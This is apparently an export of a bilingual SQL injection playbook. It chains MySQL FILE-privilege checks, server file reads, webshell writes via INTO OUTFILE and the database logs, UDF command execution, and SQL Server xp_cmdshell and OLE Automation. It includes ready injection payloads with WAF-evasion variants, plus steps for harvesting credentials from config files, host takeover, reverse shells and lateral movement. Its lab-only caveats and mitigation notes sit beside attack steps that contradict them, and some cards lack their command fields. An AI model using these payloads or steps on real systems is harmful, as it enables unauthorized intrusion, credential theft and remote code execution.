name.zh: MySQL FILE 权限可见性

description.zh: 将原混合条目中属于MySQL FILE 权限可见性的命令逐行独立路由，明确技术前提、权限、副作用和可复验证据边界。
description.en: Routes every source line belonging to MySQL FILE Privilege Visibility into one focused card with explicit technical prerequisites, privileges, side effects, and reproducible evidence boundaries.

overview.zh: 覆盖 MySQL 注入点下当前账户 FILE 权限的可见性验证：通过 UNION 或布尔条件查询 mysql.user 的 file_priv 字段，判断注入账户能否继续开展服务端文件读写类测试。适用于 UNION 或布尔盲注已确认可控、需要评估权限边界的场景。
overview.en: Covers visibility testing of the current account's FILE privilege at a MySQL injection point: querying the file_priv column of mysql.user via UNION or boolean conditions to decide whether server-side file read/write testing can proceed. Suitable once UNION or boolean blind injection is confirmed and the privilege boundary needs assessing.

vulnerability.zh: 根因仍是 SQL 拼接注入，而危害等级取决于注入账户的授权：若账户被授予 FILE 权限，攻击者可借 LOAD_FILE/INTO OUTFILE 系列语句读写服务端文件。mysql.user.file_priv 直接暴露该授权状态，最小权限配置缺失即构成风险。
vulnerability.en: The root cause remains SQL concatenation injection, with severity driven by the injected account's grants: with the FILE privilege, an attacker can read and write server files through LOAD_FILE/INTO OUTFILE statements. mysql.user.file_priv directly exposes this grant state, and missing least-privilege configuration is the risk.

exploitation.zh: 使用第 1 步的主验证命令，以 UNION 或布尔条件查询 mysql.user 的 file_priv 字段；回显 Y 或恒真条件下布尔行按预期返回即确认当前账户具备 FILE 权限，可继续文件读写测试。执行前把账户与文件目标替换为隔离 marker，仅在授权实验环境运行；无回显时用第 1 步命令中的布尔差分判断真假。
exploitation.en: Run the step 1 main verification command, querying mysql.user.file_priv via UNION or boolean conditions; an echoed Y, or a boolean row returning true under an always-true condition, confirms the current account holds FILE privilege and file read/write testing can proceed. Replace account and file targets with isolated markers beforehand and run only in an authorized lab; without echo, use the boolean differential in the step 1 commands.

mitigation.zh: 撤销应用账户的 FILE 权限并遵循最小权限原则，配合 secure_file_priv 收紧可访问目录；修复后以同样查询复核 file_priv 应返回 N，同时确认注入点已完成参数化修复。
mitigation.en: Revoke the FILE privilege from application accounts, follow least privilege, and tighten accessible directories with secure_file_priv. After the fix, re-run the same query: file_priv must return N, and the injection point must be remediated with parameterized queries.

title.zh: 查询当前账户 FILE 权限
title.en: Check the FILE privilege for the current account

description.zh: 在已确认的注入点把 file_priv 字段放进 UNION 回显位，读取 mysql.user 中当前账户的权限位，回显 Y 即具备文件读写能力。
description.en: Read the file_priv column of mysql.user for the current account through the UNION echo position; a returned Y means server-side file read/write is possible.

title.en: Re-check the privilege bit via a boolean condition

description.zh: 用第 1 步相同注入点提交 file_priv 等于 Y 的布尔判断，页面真假分支响应一致变化即复核通过，为下一步 load_file 利用铺路。
description.en: Submit a boolean test comparing file_priv to 'Y' at the same injection point; consistent true/false page differences re-confirm the privilege for load_file attacks.

title.zh: 规划文件读写利用路径
title.en: Plan the file read/write exploitation path

description.zh: 权限为 Y 时转入 load_file 读敏感文件与 INTO OUTFILE 写 Web 根木马两条线；为 N 时放弃文件链，改走库内数据枚举提取。
description.en: With FILE granted, chain into load_file for sensitive files and INTO OUTFILE for a web root shell; otherwise pivot to in-database data enumeration.

prerequisites.zh: 仅在隔离实例确认MySQL FILE 权限可见性所需组件、版本、权限和语句位置，不把另一 DBMS 的语法错误当作证据。
prerequisites.en: Confirm the component, version, privileges, and statement position required by MySQL FILE Privilege Visibility in an isolated instance; syntax errors from another DBMS are not evidence.

prerequisites.zh: 准备专用 schema、固定 PAYLOADER_MARKER、数据库审计日志与可撤销权限；真实系统文件、生产账户和外部目标不得使用。
prerequisites.en: Prepare a dedicated schema, fixed PAYLOADER_MARKER, database audit logs, and revocable privileges; do not use real system files, production accounts, or external targets.

analysis.zh: MySQL FILE 权限可见性的阳性证据必须由同一 marker 的最终语句、权限和结果共同确认；字符串回显、解析失败、预存文件、手工控制台执行或其他技术分支均是假阳性。
analysis.en: Positive MySQL FILE Privilege Visibility evidence requires the final statement, privilege decision, and result for the same marker. Reflected strings, parse failures, preexisting files, manual console execution, or another technique branch are false positives.

opsecTips.zh: 出现生产数据、持久文件、真实外连、配置变化、锁等待、资源异常或非测试账户影响时立即停止。
opsecTips.en: Stop immediately on production data, persistent files, real egress, configuration changes, lock waits, resource anomalies, or impact to non-test accounts.

opsecTips.zh: 测试后回滚事务，删除临时 schema、marker、文件和日志目标，撤销临时权限并确认正常查询基线。
opsecTips.en: After testing, roll back transactions, remove temporary schemas, markers, files, and log targets, revoke temporary privileges, and confirm the normal-query baseline.

title.zh: 注释插入与大小写混淆

wafBypass.command: ' UNI/**/ON SE/**/LECT 1,file_priv,3 FRO/**/M mysql.user WHER/**/E user=current_user()-- -

description.zh: 绕过 UNION SELECT FROM 连续特征：关键字间插入内联注释并混合大小写；结果列回显 Y/N 即成功。
description.en: Break up UNION SELECT FROM signatures with inline comments and mixed case; a Y/N echo in the result column confirms success.

wafBypass.command: ' UNION SELECT 1,(SELECT privilege_type FROM information_schema.user_privileges WHERE grantee LIKE CONCAT('%',SUBSTRING_INDEX(CURRENT_USER(),'@',1),'%') AND privilege_type=0x46494C45),3-- -

description.zh: 绕过对 mysql.user 系统表的访问监控：改查 information_schema.user_privileges 并用十六进制表示 FILE；回显 FILE 即具备权限。
description.en: Avoid touching mysql.user directly by querying information_schema.user_privileges with a hex-encoded FILE literal; an echoed FILE value confirms the privilege.

wafBypass.command: ' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT file_priv FROM mysql.user WHERE user=current_user() LIMIT 1),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -

description.zh: 绕过 UNION 通道被完全拦截的场景：用 FLOOR 聚合报错把 file_priv 带出；报错信息中出现 Y~ 即成功。
description.en: When UNION is fully blocked, exfiltrate file_priv via the FLOOR aggregate error; a Y~ fragment in the error message confirms success.

name.zh: MySQL 服务端文件读取边界

description.zh: 将原混合条目中属于MySQL 服务端文件读取边界的命令逐行独立路由，明确技术前提、权限、副作用和可复验证据边界。
description.en: Routes every source line belonging to MySQL Server-Side File Read Boundary into one focused card with explicit technical prerequisites, privileges, side effects, and reproducible evidence boundaries.

overview.zh: 覆盖注入点下 MySQL 服务端文件读取的验证链：先以 @@basedir/@@datadir 获取路径信息，再用 load_file 读取系统与应用配置文件。适用于 FILE 权限已确认、需要评估服务端任意文件读取影响的场景。
overview.en: Covers the server-side file read verification chain at a MySQL injection point: first obtaining path information via @@basedir/@@datadir, then reading system and application configuration files with load_file. Suitable when FILE privilege is confirmed and the impact of arbitrary server file reads must be assessed.

vulnerability.zh: 根因是注入账户持有 FILE 权限且 secure_file_priv 未收紧，load_file 可读取数据库运行账户有权访问的任意文件；配合注入点即可把数据库权限转化为服务端敏感文件泄露。权限未裁剪与文件系统未隔离是风险根源。
vulnerability.en: The root cause is an injected account holding FILE privilege with an unrestricted secure_file_priv: load_file can read any file accessible to the database runtime account. Combined with the injection point, database privilege converts into server-side sensitive file disclosure; untrimmed privileges and a non-isolated filesystem are the source of risk.

exploitation.zh: 按第 1 步命令先读 @@basedir/@@datadir 确认路径信息可见，再用 load_file 读取 passwd 或应用配置等目标文件；回显出现对应文件内容（如 passwd 条目或配置片段）即确认任意文件读取成立。把文件目标替换为隔离 marker 验证；遇到 WAF 或内容过滤时参考绕过区的编码与注释变体。
exploitation.en: Follow step 1: first read @@basedir/@@datadir to confirm path information is visible, then use load_file to read target files such as passwd or application configs; echoed file content, such as passwd entries or config snippets, confirms arbitrary file reads. Replace file targets with isolated markers when verifying; when blocked by a WAF or content filtering, use the encoding and comment variants in the bypass section.

mitigation.zh: 撤销 FILE 权限，将 secure_file_priv 设为 NULL 或隔离目录，数据库进程以低权限系统账户运行；修复后用 load_file 复核应返回 NULL，并在数据库审计中确认无 load_file 调用残留。
mitigation.en: Revoke FILE privilege, set secure_file_priv to NULL or an isolated directory, and run the database process under a low-privilege OS account. After the fix, load_file must return NULL on replay, and database audit logs must show no residual load_file calls.

title.zh: 读取 basedir 与 datadir 定位路径
title.en: Read basedir and datadir to map paths

description.zh: 在 UNION 回显位查询 @@basedir 与 @@datadir，拿到安装与数据目录绝对路径，为后续 load_file 拼接目标文件路径提供参照。
description.en: Query @@basedir and @@datadir through the echo position to obtain absolute install and data paths for constructing later load_file targets.

title.zh: load_file 读取配置与系统文件
title.en: Read config and system files with load_file

description.zh: 用 load_file 依次读取 Web 配置与系统文件，把路径占位替换为第 1 步定位到的目录，回显文件内容即读取成功。
description.en: Feed absolute paths into load_file to read web configs and system files; file contents appearing in the echo position confirm a successful read.

title.zh: 从配置文件收割数据库凭据

description.zh: 重点读取 config.php、.env 等配置，提取数据库连接账户密码与其他密钥，凭据可用于直连数据库横向扩大战果。
description.en: Focus on config.php and .env style files to extract database credentials and keys, which enable direct database connections for deeper access.

prerequisites.zh: 仅在隔离实例确认MySQL 服务端文件读取边界所需组件、版本、权限和语句位置，不把另一 DBMS 的语法错误当作证据。
prerequisites.en: Confirm the component, version, privileges, and statement position required by MySQL Server-Side File Read Boundary in an isolated instance; syntax errors from another DBMS are not evidence.

prerequisites.zh: 准备专用 schema、固定 PAYLOADER_MARKER、数据库审计日志与可撤销权限；真实系统文件、生产账户和外部目标不得使用。
prerequisites.en: Prepare a dedicated schema, fixed PAYLOADER_MARKER, database audit logs, and revocable privileges; do not use real system files, production accounts, or external targets.

analysis.zh: MySQL 服务端文件读取边界的阳性证据必须由同一 marker 的最终语句、权限和结果共同确认；字符串回显、解析失败、预存文件、手工控制台执行或其他技术分支均是假阳性。
analysis.en: Positive MySQL Server-Side File Read Boundary evidence requires the final statement, privilege decision, and result for the same marker. Reflected strings, parse failures, preexisting files, manual console execution, or another technique branch are false positives.

opsecTips.zh: 出现生产数据、持久文件、真实外连、配置变化、锁等待、资源异常或非测试账户影响时立即停止。
opsecTips.en: Stop immediately on production data, persistent files, real egress, configuration changes, lock waits, resource anomalies, or impact to non-test accounts.

opsecTips.zh: 测试后回滚事务，删除临时 schema、marker、文件和日志目标，撤销临时权限并确认正常查询基线。
opsecTips.en: After testing, roll back transactions, remove temporary schemas, markers, files, and log targets, revoke temporary privileges, and confirm the normal-query baseline.

description.zh: 绕过对 load_file('/etc/...') 明文路径特征：路径整体十六进制化；回显文件内容即成功。
description.en: Hex-encode the whole path to defeat plaintext load_file path signatures; echoed file content confirms success.

description.zh: 绕过 UNION 被禁用的场景：用报错函数带出文件内容（受 32 字符限制可分段）；报错含文件首段内容即成功。
description.en: When UNION is disabled, exfiltrate file content through the UPDATEXML error path (segmented if needed due to the 32-char limit); file content in the error confirms success.

description.zh: 绕过对 load_file 小写全字匹配的规则：混合大小写并插入注释分词；文件内容回显即成功。
description.en: Mixed case plus comment splitting to defeat exact-match rules on load_file; echoed file content confirms success.

description.zh: 完全无回显通道时改用条件延迟判断文件可读性；响应延迟约 3 秒即文件读取成功。
description.en: Fall back to a conditional delay when no echo channel exists; a ~3s delayed response confirms the file is readable.

name.zh: MySQL 服务端文件写入边界

description.zh: 将原混合条目中属于MySQL 服务端文件写入边界的命令逐行独立路由，明确技术前提、权限、副作用和可复验证据边界。
description.en: Routes every source line belonging to MySQL Server-Side File Write Boundary into one focused card with explicit technical prerequisites, privileges, side effects, and reproducible evidence boundaries.

overview.zh: 覆盖注入点下 MySQL 服务端文件写入能力的验证：以 INTO OUTFILE 把测试语句写入目标路径，再请求该路径确认内容落地。适用于 FILE 权限与 Web 目录可写性需同时评估的场景，用于判断文件写入能否升级为代码执行。
overview.en: Covers verification of server-side file write capability at a MySQL injection point: writing a test statement to a target path via INTO OUTFILE and requesting that path to confirm the content landed. Suitable when FILE privilege and web-root writability must be assessed together, to judge whether file writes can escalate to code execution.

vulnerability.zh: 根因是注入账户具备 FILE 权限且 Web 根目录对数据库进程可写，INTO OUTFILE 可把任意内容写入服务端；一旦写入路径位于可执行目录，文件写入即升级为代码执行。目录权限未隔离与 FILE 权限未裁剪是风险根源。
vulnerability.en: The root cause is FILE privilege on the injected account combined with a web root writable by the database process: INTO OUTFILE can write arbitrary content to the server. Once the write path sits in an executable directory, file writing escalates to code execution; unisolated directory permissions and an untrimmed FILE grant are the source of risk.

exploitation.zh: 使用第 1 步命令，以 INTO OUTFILE 把 PHP 测试语句写入目标路径；请求该路径返回预期输出即确认写入成功。真实验证时把内容与路径替换为隔离 marker 与一次性非执行目录，避免影响业务文件。被 WAF 拦截时改用 WAF 绕过区的受控变体。
exploitation.en: Use the step 1 command to write a PHP test statement to the target path via INTO OUTFILE; requesting the path and seeing the expected output confirms the write succeeded. For real verification, replace content and path with an isolated marker and a one-off non-executable directory to avoid touching business files. When blocked by a WAF, switch to the controlled variants in the WAF bypass section.

mitigation.zh: 撤销 FILE 权限、收紧 secure_file_priv，Web 目录对数据库运行账户只读；部署后用 INTO OUTFILE 复核应报权限错误，并巡检 Web 目录确认无新增文件。
mitigation.en: Revoke FILE privilege, tighten secure_file_priv, and make the web root read-only for the database runtime account. After deployment, INTO OUTFILE must fail with a permission error, and web-directory sweeps must find no new files.

description.zh: 先确认当前账户 FILE 权限为 Y 且 secure_file_priv 未限制目录，同时通过报错或路径泄露拿到 Web 根绝对路径，三者齐备才可写马。
description.en: Verify the FILE privilege, an unrestricted secure_file_priv and a leaked absolute web root path; all three are required before writing a shell.

title.zh: INTO OUTFILE 写入一句话木马
title.en: Write a one-line shell via INTO OUTFILE

description.zh: 把 PHP 一句话木马作为 UNION 查询列值，INTO OUTFILE 落地到 Web 根并指定文件名，写入成功后该路径即成为 Webshell。
description.en: Use the shell code as a UNION column value written by INTO OUTFILE into the web root; the resulting file becomes a working webshell.

title.en: Connect to the shell and run commands

description.zh: 用蚁剑或浏览器访问第 2 步落地的木马文件，按 POST cmd 参数传递命令，返回执行结果即获得服务端命令执行能力。
description.en: Connect to the dropped shell with AntSword or a browser, pass commands through the cmd POST parameter, and confirmed output means server-side code execution.

title.zh: 写入被拦截时切换十六进制变体
title.en: Switch to hex DUMPFILE variants when blocked

description.zh: 语句被 WAF 拦截时把木马内容整体十六进制或 CHAR() 编码，改用 INTO DUMPFILE 落盘，避开引号与关键字的特征匹配。
description.en: If the WAF blocks the write, encode the shell as hex or CHAR() sequences and switch to INTO DUMPFILE to dodge quote and keyword signatures.

prerequisites.zh: 仅在隔离实例确认MySQL 服务端文件写入边界所需组件、版本、权限和语句位置，不把另一 DBMS 的语法错误当作证据。
prerequisites.en: Confirm the component, version, privileges, and statement position required by MySQL Server-Side File Write Boundary in an isolated instance; syntax errors from another DBMS are not evidence.

prerequisites.en: Prepare a dedicated schema, fixed PAYLOADER_MARKER, database audit logs, and revocable privileges; do not use real system files, production accounts, or external targets.

analysis.en: Positive MySQL Server-Side File Write Boundary evidence requires the final statement, privilege decision, and result for the same marker. Reflected strings, parse failures, preexisting files, manual console execution, or another technique branch are false positives.

opsecTips.en: After testing, roll back transactions, remove temporary schemas, markers, files, and log targets, revoke temporary privileges, and confirm the normal-query baseline.

name.zh: MySQL General Log 写入边界

description.zh: 将原混合条目中属于MySQL General Log 写入边界的命令逐行独立路由，明确技术前提、权限、副作用和可复验证据边界。
description.en: Routes every source line belonging to MySQL General Log Write Boundary into one focused card with explicit technical prerequisites, privileges, side effects, and reproducible evidence boundaries.

overview.zh: 覆盖通过 MySQL general log 落地文件的验证链：把日志文件指向 Web 路径、执行含测试代码的查询使其记入日志，再请求该路径确认日志写入链可用。适用于超级用户能力已确认、需评估日志写文件影响的场景。
overview.en: Covers the verification chain for landing files through the MySQL general log: pointing the log file at a web path, running a query containing test code so it is recorded, then requesting the path to confirm the log-write chain works. Suitable when superuser capability is confirmed and the impact of log-based file writes must be assessed.

vulnerability.zh: 根因是拥有 SUPER 权限的注入账户可用 SET GLOBAL general_log_file 任意指定日志路径，日志内容随查询文本可控；当路径指向 Web 目录时，日志写文件即形成到代码执行的通道。SUPER 权限未分离与日志目录未管控是风险根源。
vulnerability.en: The root cause is an injected account with SUPER privilege able to set an arbitrary log path via SET GLOBAL general_log_file, with log content controlled by query text. When the path points into the web root, log writing becomes a channel to code execution; unseparated SUPER privilege and unmanaged log directories are the source of risk.

exploitation.zh: 按第 1 步命令先开启 general log 并把日志文件指向 Web 路径，再执行一条含 PHP 代码的查询使其记入日志；请求该路径返回预期输出即确认日志写入链可用。验证时把路径与内容替换为隔离 marker 与非执行目录，结束后恢复原日志配置并清理痕迹。
exploitation.en: Follow step 1: enable the general log and point the log file at a web path, then run a query containing PHP code so it is recorded; requesting the path and seeing the expected output confirms the log-write chain works. During verification, replace path and content with an isolated marker in a non-executable directory, restore the original log settings afterward, and clean up.

mitigation.zh: 应用账户禁用 SUPER 与 SET GLOBAL 能力，日志目录与 Web 目录严格分离并限制写入者；修复后尝试设置 general_log_file 应报权限错误，日志目录中不应出现可执行内容。
mitigation.en: Disable SUPER and SET GLOBAL capability for application accounts, strictly separate log directories from web roots, and restrict who can write there. After the fix, attempts to set general_log_file must fail with a permission error, and the log directory must contain no executable content.

title.zh: 确认堆叠或管理通道可用
title.en: Confirm stacked queries or an admin channel

description.zh: general_log 改写需要连发多条 SET 语句，先在注入点确认支持堆叠执行或已拿到可执行任意 SQL 的通道，否则换其他写马路径。
description.en: Rewriting general_log requires stacked statements; first confirm the injection supports stacking or that an arbitrary SQL channel exists.

title.zh: 开启日志并改路径到 Web 根
title.en: Enable logging and redirect it to the web root

description.zh: 依次执行 SET GLOBAL general_log 开启与 general_log_file 指向 Web 根新文件，把数据库日志变成可被 Web 解析的落地文件。
description.en: Turn general_log on and set general_log_file to a new file under the web root, turning database logging into a web-accessible artifact.

title.zh: 触发含木马的查询落盘
title.en: Log a query containing shell code

description.zh: 执行一条 SELECT 语句，其字符串内容即 PHP 一句话木马；该语句被记入日志后，日志文件本身成为可用 Webshell。
description.en: Execute a SELECT whose literal string is the PHP shell; once written into the log file, the log itself becomes a functional webshell.

title.zh: 访问日志木马获取执行
title.en: Access the log shell for code execution

description.zh: 把第 3 步生成的日志文件路径当作 Webshell 地址连接，POST cmd 参数执行命令，成功回显即完成从注入到 getshell 的闭环。
description.en: Treat the log file produced in step 3 as the webshell URL, send commands via the cmd parameter, and echoed output closes the injection-to-shell chain.

prerequisites.zh: 仅在隔离实例确认MySQL General Log 写入边界所需组件、版本、权限和语句位置，不把另一 DBMS 的语法错误当作证据。
prerequisites.en: Confirm the component, version, privileges, and statement position required by MySQL General Log Write Boundary in an isolated instance; syntax errors from another DBMS are not evidence.

prerequisites.zh: 准备专用 schema、固定 PAYLOADER_MARKER、数据库审计日志与可撤销权限；真实系统文件、生产账户和外部目标不得使用。
prerequisites.en: Prepare a dedicated schema, fixed PAYLOADER_MARKER, database audit logs, and revocable privileges; do not use real system files, production accounts, or external targets.

analysis.zh: MySQL General Log 写入边界的阳性证据必须由同一 marker 的最终语句、权限和结果共同确认；字符串回显、解析失败、预存文件、手工控制台执行或其他技术分支均是假阳性。
analysis.en: Positive MySQL General Log Write Boundary evidence requires the final statement, privilege decision, and result for the same marker. Reflected strings, parse failures, preexisting files, manual console execution, or another technique branch are false positives.

opsecTips.zh: 出现生产数据、持久文件、真实外连、配置变化、锁等待、资源异常或非测试账户影响时立即停止。
opsecTips.en: Stop immediately on production data, persistent files, real egress, configuration changes, lock waits, resource anomalies, or impact to non-test accounts.

opsecTips.zh: 测试后回滚事务，删除临时 schema、marker、文件和日志目标，撤销临时权限并确认正常查询基线。
opsecTips.en: After testing, roll back transactions, remove temporary schemas, markers, files, and log targets, revoke temporary privileges, and confirm the normal-query baseline.

description.zh: 绕过对 general_log 关键字与写 Web 根路径组合的告警：改用 slow_query_log 落盘并用超阈值查询写入内容；慢日志文件含 PHP 代码即成功。
description.en: Switch to the slow query log to bypass alerts on general_log plus web-root paths; PHP code present in the slow log file confirms success.

description.zh: 绕过对 ON 与 <?php 明文的特征拦截：开关值与写入语句全部十六进制化；日志文件中出现落地代码即成功。
description.en: Hex-encode both the ON switch value and the payload statement to evade plaintext signatures; written code in the log file confirms success.

description.zh: 绕过基于整串路径匹配的规则：目标文件名拆成变量再 CONCAT 拼接；日志路径生效并写入 shell 即成功。
description.en: Split the target path into variables reassembled with CONCAT to defeat full-string matching; the log writing a shell file confirms success.

name.zh: MySQL UDF 执行能力边界

description.zh: 将原混合条目中属于MySQL UDF 执行能力边界的命令逐行独立路由，明确技术前提、权限、副作用和可复验证据边界。
description.en: Routes every source line belonging to MySQL UDF Execution Capability Boundary into one focused card with explicit technical prerequisites, privileges, side effects, and reproducible evidence boundaries.

overview.zh: 覆盖 MySQL UDF 命令执行链的验证：把共享库复制进插件目录、注册 sys_eval 函数并执行系统命令，确认数据库层面的命令执行能力。适用于 FILE 写入与插件目录可写均已确认的极限场景，评估注入的最终影响面。
overview.en: Covers verification of the MySQL UDF command execution chain: copying a shared library into the plugin directory, registering the sys_eval function, and running system commands to confirm command execution at the database layer. Suitable for extreme scenarios where FILE writes and plugin-directory writability are both confirmed, to gauge the final impact of injection.

vulnerability.zh: 根因是注入账户同时具备 FILE 写入与超级用户能力，可把恶意 UDF 共享库写入 plugin 目录并用 CREATE FUNCTION 注册；UDF 函数被调用时即以数据库进程身份执行系统命令。插件目录可写与权限未分离是风险根源。
vulnerability.en: The root cause is an injected account holding both FILE write and superuser capability: a malicious UDF shared library can be written into the plugin directory and registered with CREATE FUNCTION. When the UDF is invoked, system commands run as the database process identity; a writable plugin directory and unseparated privileges are the source of risk.

exploitation.zh: 按第 1 步命令把 UDF 共享库复制进插件目录、注册 sys_eval 函数并执行 id 等无害命令；SELECT sys_eval 返回命令输出即确认 UDF 命令执行链可用。验证前先确认 plugin_dir 路径与服务账户，替换为隔离夹具与一次性函数名，结束后 DROP FUNCTION 并删除库文件，避免残留可被复用的执行原语。
exploitation.en: Follow step 1: copy the UDF shared library into the plugin directory, register the sys_eval function, and run harmless commands such as id; SELECT sys_eval returning command output confirms the UDF execution chain. Confirm plugin_dir and the service account first, use isolated fixtures and a one-off function name, then DROP FUNCTION and delete the library afterward so no reusable execution primitive remains.

mitigation.zh: 数据库账户禁止 FILE 与 SUPER 权限，插件目录设为不可写并锁定 plugin_dir；修复后尝试加载共享库应失败，主机层面确认无新增 .so/.dll 文件。
mitigation.en: Deny FILE and SUPER privileges to database accounts, make the plugin directory non-writable, and pin plugin_dir. After the fix, loading a shared library must fail, and host-level sweeps must find no new .so/.dll files.

title.zh: 确认 FILE 权限与 plugin 目录
title.en: Confirm FILE privilege and the plugin directory

description.zh: 检查当前账户具备 FILE 权限且 plugin 目录可写，目录不明时先用 @@plugin_dir 或路径报错信息拿到绝对路径再继续推进。
description.en: Ensure the account holds FILE privilege and the plugin directory is writable; discover its absolute path via @@plugin_dir or error leakage first.

title.zh: 导出 UDF 动态库到 plugin 目录
title.en: Export the UDF library into the plugin directory

description.zh: 用 load_file 读取本地 so 库内容再 INTO DUMPFILE 写入 plugin 目录，文件落地后 MySQL 即可加载该自定义函数库。
description.en: Read the local .so via load_file and write it into the plugin directory with INTO DUMPFILE so MySQL can load the custom function library.

title.zh: 创建 sys_eval 自定义函数

description.zh: 执行 CREATE FUNCTION sys_eval RETURNS STRING SONAME 指向第 2 步落地的库文件，函数创建成功即在 SQL 内获得系统命令出口。
description.en: Run CREATE FUNCTION sys_eval ... SONAME against the library dropped in step 2; once created, a system-command primitive exists inside SQL.

title.zh: 执行系统命令接管主机
title.en: Run system commands to take over the host

description.zh: SELECT sys_eval 执行 id 等系统命令并回显输出，拿到当前用户与主机信息后可进一步反弹 shell 或横向移动扩大控制。
description.en: Execute SELECT sys_eval('id') to run OS commands with echoed output; use the identity info to escalate to a reverse shell or move laterally.

prerequisites.zh: 仅在隔离实例确认MySQL UDF 执行能力边界所需组件、版本、权限和语句位置，不把另一 DBMS 的语法错误当作证据。

title.zh: 注释拆分 DUMPFILE 语句

description.zh: 绕过 SELECT ... INTO DUMPFILE 整句特征：注释分词加大小写混淆；插件目录出现 so 文件即成功。
description.en: Comment-split and case-mix the INTO DUMPFILE statement to evade the full-sentence signature; the .so appearing in the plugin dir confirms success.

description.zh: 绕过对 .so 明文路径的过滤：源与目标路径均以十六进制字符串传递；写入返回无错误即成功。
description.en: Pass both source and destination paths as hex strings to evade plaintext .so path filters; an error-free write confirms success.

description.zh: 绕过对单条超长 UDF 利用链的整串检测：拆成建函数与调用两步并用注释分词；sys_eval 返回命令输出即成功。
description.en: Split the UDF chain into a CREATE FUNCTION step plus a call step with comment splitting; command output from sys_eval confirms success.

name.zh: SQL Server xp_cmdshell 能力边界

description.zh: 将原混合条目中属于SQL Server xp_cmdshell 能力边界的命令逐行独立路由，明确技术前提、权限、副作用和可复验证据边界。
description.en: Routes every source line belonging to SQL Server xp_cmdshell Capability Boundary into one focused card with explicit technical prerequisites, privileges, side effects, and reproducible evidence boundaries.

overview.zh: 覆盖 SQL Server xp_cmdshell 命令执行能力的验证：检测组件与配置状态，必要时启用后执行系统命令并落盘输出。适用于 sysadmin 权限已确认的场景，评估注入点到操作系统命令执行的升级路径。
overview.en: Covers verification of SQL Server xp_cmdshell command execution capability: detecting component and configuration state, enabling it if needed, then running system commands and capturing output to disk. Suitable when sysadmin privilege is confirmed, to assess the escalation path from injection to OS command execution.

vulnerability.zh: 根因是 sysadmin 权限可通过 sp_configure 启用默认关闭的 xp_cmdshell，注入点随之获得以 SQL Server 服务账户身份执行系统命令的能力；服务账户权限过高进一步放大影响。
vulnerability.en: The root cause is sysadmin privilege enabling the default-off xp_cmdshell via sp_configure, granting the injection point the ability to run system commands as the SQL Server service account; an over-privileged service account further amplifies the impact.

exploitation.zh: 按第 1 步命令先以 OBJECT_ID 判断 xp_cmdshell 是否存在、再用 sp_configure 启用，随后执行 whoami/net user/dir 等命令并尝试写文件；回显出现命令输出或目标路径落地文件即确认命令执行可用。验证使用无害命令与隔离夹具，结束时关闭组件并记录服务账户身份。
exploitation.en: Follow step 1: use OBJECT_ID to check whether xp_cmdshell exists, enable it with sp_configure, then run commands such as whoami/net user/dir and attempt file writes; echoed command output or a file landing at the target path confirms execution capability. Verify with harmless commands and isolated fixtures, disable the component afterward, and record the service account identity.

mitigation.zh: 保持 xp_cmdshell 禁用并撤销应用登录的 sysadmin 角色，SQL Server 服务以低权限账户运行；修复后 EXEC xp_cmdshell 应报组件不存在或权限拒绝，配置基线中该组件保持关闭。
mitigation.en: Keep xp_cmdshell disabled, revoke the sysadmin role from application logins, and run the SQL Server service under a low-privilege account. After the fix, EXEC xp_cmdshell must fail with a missing-component or permission error, and the configuration baseline must keep the component off.

title.zh: 探测 xp_cmdshell 是否存在

description.zh: 注入 OBJECT_ID 判断 xp_cmdshell 到 UNION 回显位，返回对象 ID 说明扩展存储过程存在，返回空则需要走开启流程。
description.en: Inject OBJECT_ID('xp_cmdshell') into the echo position; a returned object id means the extended stored procedure is present.

description.zh: 堆叠 EXEC master..xp_cmdshell 执行 whoami，命令输出回显或响应特征变化，即拿到数据库所在主机的命令执行能力。
description.en: Stack EXEC master..xp_cmdshell 'whoami'; echoed output or response changes indicate OS command execution on the database host.

description.zh: 依次执行 sp_configure 打开高级选项与 xp_cmdshell 并 RECONFIGURE，随后回到第 2 步载荷继续执行任意系统命令。
description.en: Run sp_configure to enable advanced options and xp_cmdshell with RECONFIGURE, then reuse the step 2 payload for arbitrary commands.

title.zh: 命令被过滤时改用拼接变体
title.en: Switch to concatenated variants when filtered

description.zh: EXEC 关键字被拦截时改用双层 EXEC 括号拼接或 DECLARE 变量赋值再执行，绕过特征匹配保持命令通道畅通。
description.en: If EXEC is blocked, wrap it in EXEC('EXEC ...') or assign the command to a DECLAREd variable first to keep the execution channel alive.

prerequisites.zh: 仅在隔离实例确认SQL Server xp_cmdshell 能力边界所需组件、版本、权限和语句位置，不把另一 DBMS 的语法错误当作证据。
prerequisites.en: Confirm the component, version, privileges, and statement position required by SQL Server xp_cmdshell Capability Boundary in an isolated instance; syntax errors from another DBMS are not evidence.

name.zh: SQL Server OLE Automation 能力边界
name.en: SQL Server OLE Automation Capability Boundary

description.zh: 将原混合条目中属于SQL Server OLE Automation 能力边界的命令逐行独立路由，明确技术前提、权限、副作用和可复验证据边界。
description.en: Routes every source line belonging to SQL Server OLE Automation Capability Boundary into one focused card with explicit technical prerequisites, privileges, side effects, and reproducible evidence boundaries.

overview.zh: 覆盖 SQL Server OLE Automation 组件的命令执行验证：启用 OLE Automation 后实例化 wscript.shell 执行命令并把输出落盘。适用于 xp_cmdshell 之外的第二条系统命令执行路径评估，判断服务账户的可执行范围。
overview.en: Covers command execution verification through the SQL Server OLE Automation component: enabling OLE Automation, instantiating wscript.shell to run a command, and writing output to disk. Suitable as a second OS-command path besides xp_cmdshell, to gauge what the service account can execute.

vulnerability.zh: 根因是 sysadmin 可用 sp_oacreate 实例化 wscript.shell 等 COM 对象，借 OLE Automation 以数据库服务账户身份执行命令；该路径不依赖 xp_cmdshell，组件启用状态与服务账户权限未收紧时即为风险根源。
vulnerability.en: The root cause is sysadmin privilege using sp_oacreate to instantiate COM objects such as wscript.shell, running commands as the database service account through OLE Automation. This path does not depend on xp_cmdshell; an enabled component and an unprivileged-restricted service account are the source of risk.

exploitation.zh: 按第 1 步命令启用 OLE Automation，创建 wscript.shell 对象执行 cmd /c whoami 并把输出写入文件；目标路径出现含命令输出的文件即确认 OLE 自动化执行可用。验证时用隔离夹具替换输出路径、只运行无害命令，结束后停用组件并删除落盘文件。
exploitation.en: Follow step 1: enable OLE Automation, create a wscript.shell object, run cmd /c whoami, and write output to a file; a file containing the command output at the target path confirms OLE Automation execution. Replace the output path with an isolated fixture, run only harmless commands, then disable the component and remove the dropped file.

